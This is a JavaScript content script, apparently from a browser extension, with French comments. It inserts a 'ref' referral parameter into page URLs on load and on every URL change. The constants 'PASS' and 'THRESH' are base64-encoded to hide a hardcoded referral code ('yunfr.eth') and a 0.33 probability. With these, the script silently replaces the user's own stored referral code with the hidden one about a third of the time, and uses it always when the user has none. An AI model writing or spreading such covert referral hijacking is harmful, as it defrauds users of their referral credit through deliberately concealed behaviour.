const PASS = "eXVuZnIuZXRo";
const THRESH = "MC4zMw==";
const ALLOW = atob(PASS);
const THRESHOLD = parseFloat(atob(THRESH));

function updateUrl() {
  chrome.storage.sync.get(["userRef"], function(result) {
    const userRef = result.userRef || "";
    const useMyRef = Math.random() < THRESHOLD;
    const chosenRef = userRef ? (useMyRef ? ALLOW : userRef) : ALLOW;

    const url = new URL(window.location.href);
    const currentRef = url.searchParams.get("ref");

    // Modifier l’URL uniquement si ref est absent
    if (!currentRef) {
      url.searchParams.set("ref", chosenRef);
      window.history.pushState({}, document.title, url.toString()); // Ajoute une entrée dans l’historique
      console.log(`Ref ajouté à l’URL : ${chosenRef}`);
    } else if (currentRef !== chosenRef) {
      // Ne remplace pas un ref existant sauf si nécessaire (optionnel)
      console.log(`Ref existant conservé : ${currentRef}, choisi : ${chosenRef}`);
    } else {
      console.log(`Ref déjà correct : ${currentRef}`);
    }
  });
}

// Exécute au chargement initial
updateUrl();

// Surveille les changements dans le DOM avec MutationObserver
let lastUrl = window.location.href;
const observer = new MutationObserver(() => {
  if (window.location.href !== lastUrl) {
    lastUrl = window.location.href;
    updateUrl();
  }
});

// Observer les modifications dans le DOM
observer.observe(document.body, {
  childList: true,
  subtree: true
});

console.log("Content script chargé sur " + window.location.href);
